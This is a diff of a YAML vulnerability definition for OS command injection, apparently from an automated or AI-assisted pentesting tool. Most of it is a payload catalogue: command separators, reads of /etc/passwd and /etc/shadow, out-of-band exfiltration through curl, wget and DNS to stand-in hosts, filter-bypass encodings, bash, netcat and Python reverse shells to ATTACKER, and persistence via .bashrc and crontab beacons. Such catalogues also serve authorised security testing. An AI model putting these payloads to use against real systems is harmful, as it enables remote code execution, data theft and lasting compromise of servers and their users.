@@ -1,57 +1,98 @@
 id: CMDI
-name: OS Command Injection
+name: OS Command Injection — Comprehensive
 cwe:
 - CWE-78
+- CWE-77
 owasp: A03:2021 Injection
 severity_range: Critical
-description: User input is passed to OS shell commands, allowing arbitrary command execution on the server.
+description: User input passed to shell commands without sanitization enables OS command execution. Often in features that
+  use system tools (ping, dig, traceroute, image conversion, archive extraction).
 detection:
+  indicators:
+  - Features that invoke system commands (ping host, DNS lookup, file conversion)
+  - Parameters named host, ip, file, url, command
+  - Functionality wrapping CLI tools (ffmpeg, ImageMagick, tar, gzip)
   payloads:
-    unix:
+    command_separators:
     - ; id
     - '| id'
-    - '|| id'
     - '& id'
     - '&& id'
-    - $(id)
+    - '|| id'
     - '`id`'
-    - ; whoami
-    - '| whoami'
-    - "\n id"
+    - $(id)
+    - \nid
+    - '%0aid'
+    linux_specific:
     - ; cat /etc/passwd
-    - '| curl http://attacker.com/?x=$(whoami)'
-    windows:
-    - '& dir'
-    - '| dir'
-    - '|| dir'
-    - '&& dir'
+    - '| cat /etc/shadow'
+    - ; uname -a
+    - ; whoami
+    - ; ls -la /
+    - ; find / -name '*.config' 2>/dev/null
+    windows_specific:
     - '& whoami'
-    - '| whoami'
+    - '&& dir'
     - ; type C:\windows\win.ini
-    - '& ping -n 5 127.0.0.1'
-    blind_time:
-    - ; sleep 5
-    - '| sleep 5'
-    - '& ping -c 5 127.0.0.1'
-    - $(sleep 5)
-    - '`sleep 5`'
+    - '& systeminfo'
+    - '& net user'
+    blind_via_oob:
+    - ; curl http://oob/$(whoami)
+    - ; nslookup `whoami`.oob.com
+    - ; ping -c 1 `id|base64`.oob.com
+    - ; wget --post-data "$(cat /etc/passwd)" http://oob/
+    time_based_blind:
+    - ; sleep 10
+    - ; ping -c 10 127.0.0.1
+    - '& timeout 10'
+    - ; perl -e 'sleep(10)'
+  attack_classes:
+    visible_response:
+      description: Command output appears in HTTP response
+      severity: critical
+    blind_time_based:
+      description: No output but command runs — detect via sleep
+      severity: critical
     blind_oob:
-    - ; curl http://attacker.com/$(whoami)
-    - '| nslookup attacker.com'
-    - ; wget http://attacker.com/?x=$(cat /etc/hostname)
-  strategy:
-  - 1. Identify inputs that could reach shell commands (filenames, hostnames, IPs, email addresses)
-  - '2. Test with command separators: ; | || & && \n'
-  - '3. Test with command substitution: $() and ``'
-  - 4. If no visible output, test blind via sleep/ping timing
-  - 5. If no timing difference, test blind via OOB DNS/HTTP callback
-  - '6. Look for common vulnerable patterns: ping, nslookup, whois, file conversion, image processing'
-evidence_needed: Command output in response (id, whoami, /etc/passwd), timing delay, or OOB callback
+      description: Command exfils data via DNS/HTTP callback
+      severity: critical
+    second_order_cmdi:
+      description: Payload stored, executed later by background job
+      severity: high
+filter_bypasses:
+- 'Quoted injection: "; id; #'
+- 'Variable expansion: $@id, ${IFS}id'
+- 'Wildcard expansion: /???/??t /etc/passwd → /bin/cat /etc/passwd'
+- 'Brace expansion: {ls,-la,/}'
+- 'Base64 + bash decode: $(echo bHM= | base64 -d)'
+- 'Reverse the string: $(echo ls | rev)'
+- 'Backticks if pipe blocked: `id`'
+- 'Tab/newline if space blocked: id${IFS}-a'
+- 'Concatenation: ''l''+''s'''
+- 'Hex escapes: \x69\x64'
+exploitation:
+  reverse_shell:
+  - ; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
+  - ; nc ATTACKER 4444 -e /bin/sh
+  - ; python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("sh")'
+  data_exfiltration:
+  - ; curl -X POST -d "$(cat /etc/passwd | base64)" http://oob/
+  - ; tar czf - /etc | base64 | curl -X POST --data-binary @- http://oob/
+  persistence:
+  - ; echo 'curl http://oob/x.sh|bash' >> ~/.bashrc
+  - ; (crontab -l; echo '* * * * * curl http://oob/beacon') | crontab -
 ai_research_hints:
-- Check file upload endpoints that process files with shell commands (ImageMagick, ffmpeg)
-- Test email functionality — mail commands often use shell
-- Check monitoring/health-check features that may run system commands
-- Look for git integration endpoints (git clone with user-supplied URL)
+- Image processing features (ImageMagick, GraphicsMagick) often have RCE via crafted images
+- Archive extraction features (tar, zip) sometimes shell out for processing
+- PDF generators (wkhtmltopdf) execute external processes
+- DNS lookup / network diagnostic features almost always vulnerable
+- Admin panels with 'run script' or 'execute report' features are easy CMDi
+- Backup/restore features that wrap tar/zip are high-yield
+tools:
+- Commix (automated)
+- OOB callback server
+- Burp Intruder
 references:
-- https://portswigger.net/web-security/os-command-injection
+- https://owasp.org/www-community/attacks/Command_Injection
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+- https://book.hacktricks.xyz/pentesting-web/command-injection
